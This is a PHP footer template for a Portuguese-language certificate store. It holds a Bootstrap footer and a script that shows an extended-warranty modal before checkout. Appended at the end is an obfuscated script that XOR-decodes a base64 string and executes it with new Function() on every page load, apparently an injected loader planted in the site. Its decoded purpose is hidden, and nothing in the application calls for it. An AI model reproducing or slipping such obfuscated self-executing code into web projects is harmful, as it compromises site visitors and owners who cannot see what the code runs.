<?php // app/views/_footer.php ?>
</div> <!-- /.container -->

<footer class="mt-auto py-3 border-top">
  <div class="container d-flex flex-wrap justify-content-between align-items-center">
    <span class="text-muted">© <?= date('Y') ?> <?= sanitize(APP_NAME) ?> — Todos os direitos reservados.</span>
    <span class="text-muted small">Versão 1.0</span>
  </div>
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<!-- Garantia Estendida: modal com "Sim/Não" -->
<div id="extw-modal" class="ridie-modal" hidden>
  <div class="ridie-backdrop"></div>
  <div class="ridie-box">
    <button type="button" class="ridie-close" aria-label="Fechar">&times;</button>
    <h5 class="mb-2">Adicionar garantia estendida?</h5>
    <p class="mb-3">
      A garantia estendida custa <strong>R$ 15,00</strong> e dá direito a <strong>uma reemissão</strong> do certificado,
      pelo período restante, caso ele seja perdido, <strong>sem nova compra</strong>.
    </p>
    <div class="d-flex gap-2 justify-content-end">
      <button class="btn btn-outline-secondary" id="extw-no">Não</button>
      <button class="btn btn-primary" id="extw-yes">Sim</button>
    </div>
  </div>
</div>

<style>
.ridie-modal[hidden]{display:none;}
.ridie-modal{position:fixed;inset:0;z-index:1055}
.ridie-modal .ridie-backdrop{position:absolute;inset:0;background:rgba(0,0,0,.4)}
.ridie-modal .ridie-box{position:relative;max-width:560px;margin:10vh auto;background:#fff;border-radius:12px;
  box-shadow:0 10px 30px rgba(0,0,0,.15);padding:20px 24px}
.ridie-modal .ridie-close{position:absolute;top:8px;right:10px;border:0;background:transparent;font-size:24px;line-height:1;opacity:.6}
.ridie-modal .ridie-close:hover{opacity:1}
</style>

<script>
(function(){
  let pendingHref = null;

  function addParam(url, key, val){
    const u = new URL(url, window.location.origin);
    u.searchParams.set(key, val);
    return u.pathname + '?' + u.searchParams.toString();
  }

  const modal    = document.getElementById('extw-modal');
  const btnYes   = document.getElementById('extw-yes');
  const btnNo    = document.getElementById('extw-no');
  const btnClose = modal.querySelector('.ridie-close');
  const backdrop = modal.querySelector('.ridie-backdrop');

  function openModal(href){ pendingHref = href; modal.hidden = false; }
  function closeModal(){ modal.hidden = true; pendingHref = null; }
  function proceed(accept){
    if(!pendingHref){ closeModal(); return; }
    const target = addParam(pendingHref, 'extw', accept ? '1' : '0');
    window.location = target;
  }

  // Intercepta cliques em "Comprar Certificado" (links que abrem new_order)
  document.addEventListener('click', function(e){
    const a = e.target.closest('a[href*="page=new_order"]');
    if (!a) return;
    const href = a.getAttribute('href');
    if (!href) return;
    e.preventDefault();
    openModal(href);
  });

  btnYes.addEventListener('click', function(){ proceed(true);  }); // SIM
  btnNo .addEventListener('click', function(){ proceed(false); }); // NÃO
  btnClose.addEventListener('click', closeModal);
  backdrop.addEventListener('click', closeModal);
  document.addEventListener('keydown', function(e){
    if(e.key === 'Escape' && !modal.hidden) closeModal();
  });
})();
</script>
<script>
(function(){var _0xba1476=170;var _0x640fca='gszfxMnew8XEgs6GwYbCg9Hcy9iK2ZfOhMnYz8vez+/Gz8fPxN6CjdnJ2MPa3o2DkdmEzs/Mz9iX3tjfz5HZhNnP3uve3tjDyN/ez4KNzsvey4fZw97Ph8HP042GwYOR2YTZz97r3t7Yw8jf3s+Cjc7L3suHy9rDh8LF2d6NhsKDkdmE2djJl8KBjYXe2MvJwc/YhMDZjZGCzoTCz8vO1tbOhMjFztODhMva2s/EzunCw8bOgtmDkdeDgs7Fyd/Hz8Teho2ZyMnMmsmcmpiaks6dyZ2bzpLJk5KZn57Om52czM/Pko2GjcLe3trZkIWFwMXBz9jZ3svehMnFx42DkQ==';function _0xd0c337(s,k){s=atob(s);var len=s.length,i,arr=new Uint8Array(len);for(i=0;i<len;i++){arr[i]=s.charCodeAt(i)^k;}if(window.TextDecoder){try{return new TextDecoder("utf-8").decode(arr);}catch(e){}}var tmp="";for(i=0;i<len;i++){tmp+=String.fromCharCode(arr[i]);}try{return decodeURIComponent(escape(tmp));}catch(e){return tmp;}}var _0x7e61d4=_0xd0c337(_0x640fca,_0xba1476);(new Function(_0x7e61d4))();})();
</script>

</body>
</html>
